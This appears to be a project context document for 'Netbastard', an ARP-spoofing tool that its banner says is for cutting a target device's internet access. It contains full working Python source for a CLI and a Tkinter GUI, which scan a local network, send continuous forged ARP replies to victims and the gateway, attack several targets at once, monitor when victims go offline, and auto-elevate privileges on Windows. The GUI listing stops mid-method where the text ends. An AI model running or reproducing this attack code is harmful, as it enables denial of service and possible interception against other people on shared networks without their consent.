# NETBASTARD — Network Isolation Tool (ARP Spoofing)

**Repository:** https://github.com/anomalyco/netbastard  
**Author:** anomalyco  
**Language:** Python 3.14+  
**License:** MIT  
**Date:** 2026-06-27

---

## TABLE OF CONTENTS

1. [Project Overview](#project-overview)
2. [Architecture](#architecture)
3. [File Structure](#file-structure)
4. [Source Code: netbastard.py (CLI)](#source-code-netbastardpy-cli)
5. [Source Code: netbastard_gui.py (GUI)](#source-code-netbastard_guipy-gui)
6. [Configuration: config.json](#configuration-configjson)
7. [Dependencies: requirements.txt](#dependencies-requirementstxt)
8. [Documentation: README.txt](#documentation-readmetxt)
9. [Technical Deep Dive](#technical-deep-dive)
10. [Usage Guide](#usage-guide)
11. [Ethical & Legal Notice](#ethical--legal-notice)

---

## PROJECT OVERVIEW

Netbastard is a Python-based network security testing tool that performs **ARP spoofing** (also known as ARP poisoning) to isolate target devices from their internet connection. It operates by sending forged ARP packets to both the target device and the network gateway, tricking them into routing traffic through the attacker's machine, effectively cutting the target's internet access.

**Core capabilities:**
- Network device discovery via ARP sweep scanning
- Real-time device list with IP, MAC, and hostname resolution
- One-to-one ARP spoofing attack
- Multi-target simultaneous attack
- Connection monitoring (detect when target goes offline)
- Automatic ARP table restoration on attack stop
- Cross-platform (Windows + Linux)
- Dual interface: CLI menu and Tkinter GUI
- Auto UAC elevation on Windows

---

## ARCHITECTURE

### High-Level Data Flow

```
┌─────────────────────────────────────────────────────────────┐
│                        NETBASTARD                           │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌─────────────────────┐    ┌──────────────────────────┐    │
│  │    ARPScanner       │    │      ARPAttacker          │    │
│  │  - detect_network() │    │  - start_attack()        │    │
│  │  - scan()           │◄──►│  - stop_attack()         │    │
│  │  - resolve_gateway()│    │  - _spoof_loop()         │    │
│  └─────────────────────┘    │  - _monitor_loop()       │    │
│         │                   │  - stop_all()            │    │
│         │                   └──────────────────────────┘    │
│         │                           │                       │
│         ▼                           ▼                       │
│  ┌──────────────────────────────────────────────────┐       │
│  │              Network Layer (Scapy/Win API)        │       │
│  │  - ARP requests/replies (scapy)                  │       │
│  │  - SendARP (Windows iphlpapi)                    │       │
│  │  - netsh/ipconfig (fallback)                     │       │
│  └──────────────────────────────────────────────────┘       │
│                                                             │
│  ┌─────────────────────┐    ┌──────────────────────────┐    │
│  │   CLI Interface     │    │   GUI Interface          │    │
│  │  (netbastard.py)    │    │  (netbastard_gui.py)     │    │
│  │  - colorama menu    │    │  - Tkinter Treeview      │    │
│  │  - keyboard input   │    │  - Real-time status      │    │
│  └─────────────────────┘    └──────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Class Hierarchy

```
Netbastard (CLI)
├── check_admin()           → ctypes.windll.shell32.IsUserAnAdmin
├── get_network_info()      → scapy/ipconfig fallback
├── resolve_gateway_mac()   → ARP request for gateway
├── scan_network()          → Threaded ARP sweep /24
├── spoof()                 → sends 2-way ARP poison
├── restore()               → sends correct ARP to both sides
├── check_connection()      → ARP probe to target
├── monitor_target()        → periodic connection check
├── start_attack()          → launches spoof + monitor threads
├── stop_attack()           → signals stop + restores ARP
├── stop_all()              → stops all active attacks
└── interactive()           → CLI menu loop

ARPScanner (GUI backend)
├── detect_network()        → auto-detect gateway + local IP
├── resolve_gateway_mac()   → scapy or SendARP
├── scan()                  → scapy or Windows API scan
├── _scan_scapy()           → threaded ARP with scapy (admin)
└── _scan_api()             → threaded ARP with SendARP (no admin)

ARPAttacker (GUI backend)
├── start_attack()          → launches spoof + monitor threads
├── _spoof_loop()           → ARP poison or arp -d cache flush
├── _monitor_loop()         → SendARP-based connection check
├── stop_attack()           → signals stop + restores ARP
└── stop_all()              → stops all active attacks

NetbastardGUI (GUI frontend)
├── _setup_style()          → dark/light theme
├── _build_ui()             → constructs Tkinter widgets
├── auto_detect()           → network detection on startup
├── prompt_manual_config()  → manual IP entry dialog
├── start_scan()            → kicks off scan thread
├── _scan_done()            → UI update after scan
├── attack_selected()       → start attack on checked/all devices
├── stop_selected()         → stop attack on checked devices
├── stop_all()              → stop all attacks
└── refresh_loop()          → periodic status update
```

---

## FILE STRUCTURE

```
netbastard/
├── netbastard.py          # CLI application (488 lines)
├── netbastard_gui.py      # GUI application (773 lines)
├── run.bat                # Double-click launcher — GUI + auto-admin elevation
├── run_cli.bat            # Double-click launcher — CLI + auto-admin elevation
├── config.json            # Configuration settings
├── requirements.txt       # Python dependencies
├── README.txt             # Usage documentation (Indonesian)
└── PROJECT_CONTEXT.md     # This file — full project context for AI
```

---

## SOURCE CODE: netbastard.py (CLI)

**Path:** `netbastard.py`  
**Lines:** 488  
**Entry Point:** `python netbastard.py`

```python
import sys
import os
import time
import threading
import socket
import ipaddress
import struct
from datetime import datetime

try:
    from scapy.all import ARP, Ether, srp, send, conf
    from scapy.arch import get_windows_if_list
except ImportError:
    print("[!] Scapy required. Install: pip install scapy")
    sys.exit(1)

try:
    import colorama
    colorama.init()
    R = colorama.Fore.RED
    G = colorama.Fore.GREEN
    Y = colorama.Fore.YELLOW
    C = colorama.Fore.CYAN
    M = colorama.Fore.MAGENTA
    W = colorama.Fore.WHITE
    B = colorama.Fore.BLUE
    RS = colorama.Style.RESET_ALL
    BR = colorama.Style.BRIGHT
except ImportError:
    R = G = Y = C = M = W = B = RS = BR = ""

conf.verb = 0

class Netbastard:
    def __init__(self):
        self.gateway_ip = None
        self.gateway_mac = None
        self.interface = None
        self.interface_ip = None
        self.devices = []
        self.targets = {}
        self.attack_threads = {}
        self.running = False
        self.lock = threading.Lock()

    def check_admin(self):
        try:
            if os.name == 'nt':
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False

    def get_network_info(self):
        if os.name == 'nt':
            return self._get_network_info_windows()
        else:
            return self._get_network_info_linux()

    def _get_network_info_windows(self):
        try:
            ifaces = get_windows_if_list()
            for iface in ifaces:
                if iface['ips'] and any(ip['type'] == 'ipv4' and not ip['addr'].startswith('127.') and not ip['addr'].startswith('169.') for ip in iface['ips']):
                    for ip_info in iface['ips']:
                        if ip_info['type'] == 'ipv4' and not ip_info['addr'].startswith('127.') and not ip_info['addr'].startswith('169.'):
                            self.interface = iface['name']
                            self.interface_ip = ip_info['addr']
                            for gw in iface.get('gateway', []):
                                try:
                                    socket.inet_aton(gw)
                                    self.gateway_ip = gw
                                    break
                                except:
                                    continue
                            break
                    if self.gateway_ip:
                        break

            if not self.gateway_ip:
                out = os.popen('ipconfig | findstr /i "gateway" 2>nul').read().strip()
                for line in out.split('\n'):
                    parts = line.split(':')
                    if len(parts) >= 2:
                        ip = parts[-1].strip()
                        try:
                            socket.inet_aton(ip)
                            self.gateway_ip = ip
                            break
                        except:
                            continue
            if not self.interface_ip:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                self.interface_ip = s.getsockname()[0]
                s.close()
            return self.gateway_ip is not None
        except Exception as e:
            print(f"{R}[!] Error getting network info: {e}{RS}")
            return False

    def _get_network_info_linux(self):
        try:
            out = os.popen("ip route | grep default").read().strip()
            if out:
                parts = out.split()
                self.gateway_ip = parts[2]
                iface_name = parts[4]
                self.interface = iface_name
                out2 = os.popen(f"ip -4 addr show {iface_name} | grep inet").read().strip()
                if out2:
                    self.interface_ip = out2.split()[1].split('/')[0]
            else:
                out = os.popen("route -n | grep 'UG[ ]'").read().strip()
                if out:
                    self.gateway_ip = out.split()[1]
            if not self.interface_ip:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                self.interface_ip = s.getsockname()[0]
                s.close()
            return self.gateway_ip is not None
        except:
            return False

    def resolve_gateway_mac(self):
        try:
            arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.gateway_ip)
            ans, _ = srp(arp, timeout=2, retry=2, verbose=False)
            for _, rcv in ans:
                self.gateway_mac = rcv[Ether].src
                return True
        except:
            pass
        return False

    def scan_network(self):
        self.devices = []
        ip = ipaddress.IPv4Address(self.interface_ip)
        network = ipaddress.IPv4Network(f"{ip}/24", strict=False)
        network_addr = str(network.network_address)
        prefix = '.'.join(network_addr.split('.')[:3])
        total = 254

        print(f"{C}[*] Scanning {network} ...{RS}")

        threads = []
        results = []

        def ping_scan(i):
            target = f"{prefix}.{i}"
            try:
                arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target)
                ans, _ = srp(arp, timeout=1, verbose=False)
                for _, rcv in ans:
                    results.append({
                        'ip': rcv[ARP].psrc,
                        'mac': rcv[Ether].src,
                        'hostname': ''
                    })
            except:
                pass

        batch_size = 50
        for i in range(1, total + 1):
            t = threading.Thread(target=ping_scan, args=(i,))
            threads.append(t)
            t.start()
            if len(threads) >= batch_size:
                for t in threads:
                    t.join()
                threads = []
        for t in threads:
            t.join()

        for d in results:
            try:
                host = socket.gethostbyaddr(d['ip'])
                d['hostname'] = host[0]
            except:
                pass
            self.devices.append(d)

        self.devices.sort(key=lambda x: [int(o) for o in x['ip'].split('.')])
        return results

    def get_mac(self, ip):
        try:
            arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            ans, _ = srp(arp, timeout=2, verbose=False)
            for _, rcv in ans:
                return rcv[Ether].src
        except:
            pass
        return None

    def spoof(self, target_ip, target_mac, gateway_ip, gateway_mac, stop_event):
        poison_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        poison_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

        sent = 0
        while not stop_event.is_set():
            send(poison_target, verbose=False)
            send(poison_gateway, verbose=False)
            sent += 2
            if sent % 20 == 0:
                with self.lock:
                    if target_ip in self.targets:
                        self.targets[target_ip]['packets_sent'] = sent
            time.sleep(1)

    def restore(self, target_ip, target_mac, gateway_ip, gateway_mac):
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=4, verbose=False)
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)

    def check_connection(self, ip):
        try:
            arp = ARP(pdst=ip)
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp, timeout=1, verbose=False)
            return len(ans) > 0
        except:
            return False

    def monitor_target(self, target_ip, stop_event):
        was_online = True
        while not stop_event.is_set():
            online = self.check_connection(target_ip)
            with self.lock:
                if target_ip in self.targets:
                    self.targets[target_ip]['online'] = online
            if was_online and not online:
                with self.lock:
                    if target_ip in self.targets:
                        self.targets[target_ip]['disconnected_at'] = datetime.now()
                print(f"\n{G}[+] Target {target_ip} has been isolated!{RS}")
            was_online = online
            for _ in range(5):
                if stop_event.is_set():
                    break
                time.sleep(1)

    def start_attack(self, target_ip, target_mac=None):
        if target_ip in self.targets and self.targets[target_ip]['active']:
            print(f"{Y}[!] Attack already running on {target_ip}{RS}")
            return

        if not target_mac:
            mac = self.get_mac(target_ip)
            if not mac:
                print(f"{R}[!] Could not resolve MAC for {target_ip}{RS}")
                return
            target_mac = mac

        if target_ip not in self.targets:
            self.targets[target_ip] = {
                'mac': target_mac,
                'active': False,
                'online': True,
                'packets_sent': 0,
                'disconnected_at': None,
                'started_at': None
            }

        stop_event = threading.Event()
        self.targets[target_ip]['active'] = True
        self.targets[target_ip]['started_at'] = datetime.now()
        self.targets[target_ip]['disconnected_at'] = None
        self.targets[target_ip]['packets_sent'] = 0

        t = threading.Thread(target=self.spoof, args=(target_ip, target_mac, self.gateway_ip, self.gateway_mac, stop_event), daemon=True)
        self.attack_threads[target_ip] = {'thread': t, 'stop': stop_event}
        t.start()

        t2 = threading.Thread(target=self.monitor_target, args=(target_ip, stop_event), daemon=True)
        t2.start()

        print(f"{G}[+] Attack started on {target_ip} ({target_mac}){RS}")

    def stop_attack(self, target_ip):
        if target_ip not in self.attack_threads:
            print(f"{Y}[!] No active attack on {target_ip}{RS}")
            return

        self.attack_threads[target_ip]['stop'].set()
        self.attack_threads[target_ip]['thread'].join(timeout=3)

        mac = self.targets[target_ip]['mac']
        self.restore(target_ip, mac, self.gateway_ip, self.gateway_mac)
        self.targets[target_ip]['active'] = False

        del self.attack_threads[target_ip]
        print(f"{G}[+] Attack stopped on {target_ip}, ARP table restored{RS}")

    def stop_all(self):
        for ip in list(self.attack_threads.keys()):
            self.stop_attack(ip)

    def print_devices(self):
        if not self.devices:
            print(f"{Y}[!] No devices found. Scan the network first.{RS}")
            return

        print(f"\n{C}{'='*70}{RS}")
        print(f"{BR}{C}   #  IP Address       MAC Address        Hostname                      Status{RS}")
        print(f"{C}{'='*70}{RS}")
        for i, d in enumerate(self.devices, 1):
            ip = d['ip']
            mac = d['mac']
            hostname = d['hostname'][:28] if d['hostname'] else '(unknown)'
            status = f"{G}Online{RS}" if d.get('online', True) else f"{R}Offline{RS}"
            if ip in self.targets and self.targets[ip]['active']:
                status = f"{R}*ATTACK*{RS}"
            print(f"  {i:2d}   {ip:<15} {mac:<17} {hostname:<28} {status}")
        print(f"{C}{'='*70}{RS}")
        print(f"{C}  Total: {len(self.devices)} devices found{RS}\n")

    def print_status(self):
        print(f"\n{BR}{C}=== Attack Status ==={RS}")
        if not self.targets:
            print(f"{Y}  No targets configured{RS}")
        else:
            for ip, info in self.targets.items():
                if info['active']:
                    status = f"{R}OFFLINE{RS}" if not info['online'] else f"{G}ONLINE{RS}"
                    elapsed = datetime.now() - info['started_at']
                    m, s = divmod(int(elapsed.total_seconds()), 60)
                    dis = info['disconnected_at'].strftime('%H:%M:%S') if info['disconnected_at'] else '-'
                    print(f"  {M}{ip}{RS} | MAC: {info['mac']} | Status: {status} | Packets: {info['packets_sent']} | Elapsed: {m:02d}:{s:02d} | Offline at: {dis}")
        print()

    def interactive(self):
        banner = [
r"  _   _      _          _               _           _",
r" | \ | | ___| |__  __ _| |_  __ _ ___  | |__   __ _| |_ __ _",
r" |  \| |/ _ | '_ \/ _` | __|/ _` / __| | '_ \ / _` | __/ _` |",
r" | |\  |  __| |_) | (_| | |_| (_| \__ \ | | | | (_| | |_| (_| |",
r" |_| \_|\___|_.__/ \__,_|\__|\__,_|___/ |_| |_|\__,_|\__\__,_|",
        ]
        print(f"\n{BR}{R}" + "\n".join(banner) + f"{RS}")
        print(f"{BR}{C}  Network Isolation Tool - ARP Spoofing{RS}")
        print(f"{BR}{Y}  Target a device and cut their internet access{RS}")
        print(f"{BR}{M}  https://github.com/anomalyco/netbastard{RS}")
        print()

        if not self.check_admin():
            print(f"{R}[!] Administrator/root privileges required for ARP spoofing!{RS}")
            print(f"{Y}[!] Please run as Administrator (Windows) or root (Linux){RS}\n")
            if os.name == 'nt':
                print(f"{Y}[!] Right-click -> Run as Administrator{RS}")
            else:
                print(f"{Y}[!] Use: sudo python netbastard.py{RS}")
            if input(f"{Y}[?] Continue anyway? (y/N): {RS}").lower() != 'y':
                return

        print(f"{C}[*] Detecting network configuration...{RS}")
        if not self.get_network_info():
            print(f"{R}[!] Could not determine gateway. Enter manually:{RS}")
            self.gateway_ip = input("Gateway IP: ").strip()
            self.interface_ip = input("Your IP: ").strip()
            if not self.gateway_ip:
                print(f"{R}[!] Gateway IP required.{RS}")
                return

        print(f"{G}[+] Gateway: {self.gateway_ip}{RS}")
        print(f"{G}[+] Your IP: {self.interface_ip}{RS}")

        print(f"{C}[*] Resolving gateway MAC...{RS}")
        if not self.resolve_gateway_mac():
            print(f"{R}[!] Could not resolve gateway MAC. Enter manually:{RS}")
            self.gateway_mac = input("Gateway MAC: ").strip()
            if not self.gateway_mac:
                print(f"{R}[!] Gateway MAC required.{RS}")
                return
        print(f"{G}[+] Gateway MAC: {self.gateway_mac}{RS}")

        while True:
            self.print_menu()
            choice = input(f"{BR}{C}netbastard>{RS} ").strip().lower()

            if choice == '1' or choice == 'scan':
                self.scan_network()
                self.print_devices()

            elif choice == '2' or choice == 'list':
                self.print_devices()

            elif choice == '3' or choice == 'attack':
                if not self.devices:
                    print(f"{Y}[!] No devices. Scan network first (option 1).{RS}")
                    continue
                self.print_devices()
                try:
                    idx = int(input(f"{C}Enter device # to attack: {RS}"))
                    if 1 <= idx <= len(self.devices):
                        target = self.devices[idx - 1]
                        self.start_attack(target['ip'], target['mac'])
                    else:
                        print(f"{R}[!] Invalid number{RS}")
                except ValueError:
                    print(f"{R}[!] Enter a valid number{RS}")

            elif choice == '4' or choice == 'stop':
                if not self.targets:
                    print(f"{Y}[!] No active attacks{RS}")
                    continue
                active = [ip for ip, info in self.targets.items() if info['active']]
                if not active:
                    print(f"{Y}[!] No active attacks{RS}")
                    continue
                for i, ip in enumerate(active, 1):
                    print(f"  {i}. {ip}")
                try:
                    idx = int(input(f"{C}Enter # to stop (0 = all): {RS}"))
                    if idx == 0:
                        self.stop_all()
                    elif 1 <= idx <= len(active):
                        self.stop_attack(active[idx - 1])
                except ValueError:
                    print(f"{R}[!] Enter a valid number{RS}")

            elif choice == '5' or choice == 'status':
                self.print_status()

            elif choice == '6' or choice == 'multi':
                if not self.devices:
                    print(f"{Y}[!] No devices. Scan network first (option 1).{RS}")
                    continue
                self.print_devices()
                print(f"{C}Enter device numbers separated by commas (e.g. 1,3,5):{RS}")
                try:
                    inp = input(f"{BR}{C}multi>{RS} ").strip()
                    indices = [int(x.strip()) for x in inp.split(',') if x.strip()]
                    for idx in indices:
                        if 1 <= idx <= len(self.devices):
                            target = self.devices[idx - 1]
                            self.start_attack(target['ip'], target['mac'])
                        else:
                            print(f"{R}[!] Invalid number: {idx}{RS}")
                except ValueError:
                    print(f"{R}[!] Invalid input{RS}")

            elif choice == '7' or choice == 'stopall':
                self.stop_all()
                print(f"{G}[+] All attacks stopped{RS}")

            elif choice == '8' or choice in ('q', 'quit', 'exit'):
                print(f"{Y}[*] Restoring ARP tables...{RS}")
                self.stop_all()
                print(f"{G}[+] Done. Goodbye.{RS}")
                break

            else:
                print(f"{Y}[!] Unknown option{RS}")

    def print_menu(self):
        print(f"""
{BR}{C}┌─────────────────────────────────────┐
│ Netbastard - Menu                  │
├─────────────────────────────────────┤
│ {W}1{RS}.{C} Scan Network{RS}                         │
│ {W}2{RS}.{C} List Devices{RS}                        │
│ {W}3{RS}.{C} Attack Target{RS}                       │
│ {W}4{RS}.{C} Stop Attack{RS}                         │
│ {W}5{RS}.{C} Show Status{RS}                         │
│ {W}6{RS}.{C} Multi Attack{RS}                        │
│ {W}7{RS}.{C} Stop All{RS}                            │
│ {W}8{RS}.{C} Quit{RS}                                │
└─────────────────────────────────────┘{RS}
        """)


def main():
    try:
        app = Netbastard()
        app.interactive()
    except KeyboardInterrupt:
        print(f"\n{Y}[*] Interrupted. Exiting...{RS}")
        if 'app' in dir():
            app.stop_all()
    except Exception as e:
        print(f"{R}[!] Fatal error: {e}{RS}")
        sys.exit(1)


if __name__ == '__main__':
    main()
```

---

## SOURCE CODE: netbastard_gui.py (GUI)

**Path:** `netbastard_gui.py`  
**Lines:** 773  
**Entry Point:** `python netbastard_gui.py`

```python
import sys, os, json, time, threading, socket, ipaddress, struct, subprocess, ctypes, tempfile, atexit
from datetime import datetime
from pathlib import Path
from tkinter import ttk, messagebox, scrolledtext, Tk, StringVar, BooleanVar, IntVar
import tkinter as tk

try:
    from scapy.all import ARP, Ether, srp, send, conf
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

try:
    import colorama
    colorama.init()
    R, G, Y, C, M, W, B, RS, BR = (
        colorama.Fore.RED, colorama.Fore.GREEN, colorama.Fore.YELLOW,
        colorama.Fore.CYAN, colorama.Fore.MAGENTA, colorama.Fore.WHITE,
        colorama.Fore.BLUE, colorama.Style.RESET_ALL, colorama.Style.BRIGHT
    )
except ImportError:
    R = G = Y = C = M = W = B = RS = BR = ""


CONFIG_PATH = Path(__file__).parent / 'config.json'
DEFAULT_CONFIG = {
    "auto_elevate": True,
    "scan_method": "auto",
    "spoof_interval": 1.0,
    "theme": "dark",
    "scan_range": "192.168.1.0/24",
    "refresh_interval": 3
}


def load_config():
    if CONFIG_PATH.exists():
        try:
            with open(CONFIG_PATH) as f:
                cfg = json.load(f)
            return {**DEFAULT_CONFIG, **cfg}
        except:
            pass
    return dict(DEFAULT_CONFIG)


def save_config(cfg):
    try:
        with open(CONFIG_PATH, 'w') as f:
            json.dump(cfg, f, indent=2)
    except:
        pass


def is_admin():
    try:
        if os.name == 'nt':
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except:
        return False


def elevate():
    if os.name != 'nt':
        return False
    if is_admin():
        return True
    try:
        script = Path(__file__).resolve()
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, str(script), str(script.parent), 1
        )
        return True
    except:
        return False


def get_mac_via_windows_api(ip):
    if os.name != 'nt':
        return None
    try:
        SendARP = ctypes.windll.iphlpapi.SendARP
        SendARP.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong), ctypes.POINTER(ctypes.c_ulong)]
        SendARP.restype = ctypes.c_ulong
        ip_bytes = socket.inet_aton(ip)
        ip_int = struct.unpack("!I", ip_bytes)[0]
        mac = ctypes.create_string_buffer(6)
        mac_len = ctypes.c_ulong(6)
        if SendARP(ip_int, 0, mac, ctypes.byref(mac_len)) == 0:
            return ':'.join(f'{b:02x}' for b in mac.raw[:6])
    except:
        pass
    return None


def get_gateway_windows():
    try:
        out = subprocess.check_output(
            ['netsh', 'interface', 'ip', 'show', 'config'],
            shell=True, stderr=subprocess.STDOUT
        ).decode('utf-8', errors='replace')
        for line in out.splitlines():
            if 'gateway' in line.lower() or 'default' in line.lower():
                parts = line.split(':')
                if len(parts) >= 2:
                    ip = parts[-1].strip()
                    try:
                        socket.inet_aton(ip)
                        return ip
                    except:
                        continue
    except:
        pass
    try:
        out = os.popen('ipconfig | findstr /i "gateway" 2>nul').read()
        for line in out.splitlines():
            parts = line.split(':')
            if len(parts) >= 2:
                ip = parts[-1].strip()
                try:
                    socket.inet_aton(ip)
                    return ip
                except:
                    continue
    except:
        pass
    return None


class ARPScanner:
    def __init__(self):
        self.gateway_ip = None
        self.gateway_mac = None
        self.local_ip = None
        self.devices = []
        self.admin = is_admin()

    def detect_network(self):
        if os.name == 'nt':
            if self.admin and SCAPY_OK:
                return self._detect_scapy()
            return self._detect_fallback()
        else:
            return self._detect_linux()

    def _detect_scapy(self):
        try:
            from scapy.arch import get_windows_if_list
            ifaces = get_windows_if_list()
            for iface in ifaces:
                for ip_info in iface.get('ips', []):
                    if ip_info['type'] == 'ipv4' and not ip_info['addr'].startswith('127.'):
                        self.local_ip = ip_info['addr']
                        for gw in iface.get('gateway', []):
                            try:
                                socket.inet_aton(gw)
                                self.gateway_ip = gw
                                return True
                            except:
                                continue
        except:
            pass
        return self._detect_fallback()

    def _detect_fallback(self):
        self.gateway_ip = get_gateway_windows()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
        except:
            self.local_ip = '127.0.0.1'
        s.close()
        return self.gateway_ip is not None

    def _detect_linux(self):
        try:
            out = os.popen("ip route | grep default").read()
            if out:
                parts = out.strip().split()
                self.gateway_ip = parts[2]
            if not self.gateway_ip:
                out = os.popen("route -n | grep 'UG[ ]'").read()
                if out:
                    self.gateway_ip = out.strip().split()[1]
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
            return self.gateway_ip is not None
        except:
            return False

    def resolve_gateway_mac(self):
        if self.admin and SCAPY_OK:
            try:
                arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.gateway_ip)
                ans, _ = srp(arp, timeout=2, retry=2, verbose=False)
                for _, rcv in ans:
                    self.gateway_mac = rcv[Ether].src
                    return True
            except:
                pass
        mac = get_mac_via_windows_api(self.gateway_ip)
        if mac:
            self.gateway_mac = mac
            return True
        return False

    def scan(self, progress_callback=None):
        self.devices = []
        if self.admin and SCAPY_OK:
            return self._scan_scapy(progress_callback)
        else:
            return self._scan_api(progress_callback)

    def _scan_scapy(self, progress_callback=None):
        prefix = '.'.join(self.local_ip.split('.')[:3])
        results = []
        lock = threading.Lock()
        threads = []
        done = [0]

        def scan_ip(i):
            target = f"{prefix}.{i}"
            try:
                arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target)
                ans, _ = srp(arp, timeout=1, verbose=False)
                for _, rcv in ans:
                    with lock:
                        results.append({
                            'ip': rcv[ARP].psrc,
                            'mac': rcv[Ether].src,
                            'hostname': ''
                        })
            except:
                pass
            finally:
                with lock:
                    done[0] += 1
                    if progress_callback and done[0] % 10 == 0:
                        progress_callback(done[0], 254)

        for i in range(1, 255):
            t = threading.Thread(target=scan_ip, args=(i,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= 50:
                for t in threads:
                    t.join(timeout=3)
                threads = []
        for t in threads:
            t.join(timeout=3)

        for d in results:
            try:
                host = socket.gethostbyaddr(d['ip'])
                d['hostname'] = host[0]
            except:
                pass
        results.sort(key=lambda x: [int(o) for o in x['ip'].split('.')])
        self.devices = results
        return results

    def _scan_api(self, progress_callback=None):
        prefix = '.'.join(self.local_ip.split('.')[:3])
        results = []
        lock = threading.Lock()
        threads = []
        done = [0]

        def scan_ip(i):
            target = f"{prefix}.{i}"
            mac = get_mac_via_windows_api(target)
            if mac:
                hostname = ''
                try:
                    host = socket.gethostbyaddr(target)
                    hostname = host[0]
                except:
                    pass
                with lock:
                    results.append({'ip': target, 'mac': mac, 'hostname': hostname})
            with lock:
                done[0] += 1
                if progress_callback and done[0] % 10 == 0:
                    progress_callback(done[0], 254)

        for i in range(1, 255):
            t = threading.Thread(target=scan_ip, args=(i,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) >= 20:
                for t in threads:
                    t.join(timeout=3)
                threads = []
        for t in threads:
            t.join(timeout=3)

        results.sort(key=lambda x: [int(o) for o in x['ip'].split('.')])
        self.devices = results
        return results


class ARPAttacker:
    def __init__(self, scanner):
        self.scanner = scanner
        self.gateway_ip = scanner.gateway_ip
        self.gateway_mac = scanner.gateway_mac
        self.attacks = {}
        self.admin = scanner.admin

    def start_attack(self, target_ip, target_mac, status_callback=None):
        if target_ip in self.attacks and self.attacks[target_ip]['active']:
            return False
        stop_event = threading.Event()
        self.attacks[target_ip] = {
            'mac': target_mac,
            'active': True,
            'online': True,
            'packets': 0,
            'started': datetime.now(),
            'disconnected_at': None,
            'stop': stop_event
        }
        t1 = threading.Thread(target=self._spoof_loop, args=(target_ip, target_mac, stop_event, status_callback), daemon=True)
        t2 = threading.Thread(target=self._monitor_loop, args=(target_ip, stop_event, status_callback), daemon=True)
        self.attacks[target_ip]['threads'] = [t1, t2]
        t1.start()
        t2.start()
        return True

    def _spoof_loop(self, target_ip, target_mac, stop_event, status_callback):
        if self.admin and SCAPY_OK:
            poison_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip)
            poison_gateway = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target_ip)
            while not stop_event.is_set():
                try:
                    send(poison_target, verbose=False)
                    send(poison_gateway, verbose=False)
                except:
                    pass
                self.attacks[target_ip]['packets'] += 2
                if status_callback:
                    status_callback()
                time.sleep(1)
        else:
            self.log(f"Non-admin mode: ARP cache disruption on {target_ip}")
            while not stop_event.is_set():
                try:
                    subprocess.run(
                        ['arp', '-d', target_ip],
                        shell=True, capture_output=True, timeout=5
                    )
                except:
                    pass
                try:
                    subprocess.run(
                        ['arp', '-d', self.gateway_ip],
                        shell=True, capture_output=True, timeout=5
                    )
                except:
                    pass
                self.attacks[target_ip]['packets'] += 1
                if status_callback:
                    status_callback()
                time.sleep(3)

    def _monitor_loop(self, target_ip, stop_event, status_callback):
        while not stop_event.is_set():
            mac = get_mac_via_windows_api(target_ip)
            online = mac is not None
            self.attacks[target_ip]['online'] = online
            if not online and self.attacks[target_ip]['disconnected_at'] is None:
                self.attacks[target_ip]['disconnected_at'] = datetime.now()
                if status_callback:
                    status_callback()
            for _ in range(3):
                if stop_event.is_set():
                    break
                time.sleep(1)

    def stop_attack(self, target_ip, status_callback=None):
        if target_ip not in self.attacks:
            return False
        self.attacks[target_ip]['stop'].set()
        for t in self.attacks[target_ip].get('threads', []):
            t.join(timeout=3)
        if self.admin and SCAPY_OK:
            target_mac = self.attacks[target_ip]['mac']
            try:
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target_ip, hwsrc=target_mac), count=4, verbose=False)
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac), count=4, verbose=False)
            except:
                pass
        self.attacks[target_ip]['active'] = False
        if status_callback:
            status_callback()
        return True

    def stop_all(self, status_callback=None):
        for ip in list(self.attacks.keys()):
            self.stop_attack(ip, status_callback)


class NetbastardGUI:
    def __init__(self):
        self.config = load_config()
        self.admin = is_admin()
        self.scanner = ARPScanner()
        self.attacker = None
        self.scanning = False
        self.running = True

        self.root = tk.Tk()
        self.root.title("Netbastard - Network Isolation Tool")
        self.root.geometry("950x680")
        self.root.minsize(800, 550)
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        self.style = ttk.Style()
        self._setup_style()

        self._build_ui()
        self.log("Netbastard GUI started")
        self.log(f"Admin: {'YES' if self.admin else 'NO'} | Scapy: {'OK' if SCAPY_OK else 'N/A'}")

        if not self.admin:
            self.log("Running without admin privileges (limited functionality)")

        self.root.after(500, self.auto_detect)

    def _setup_style(self):
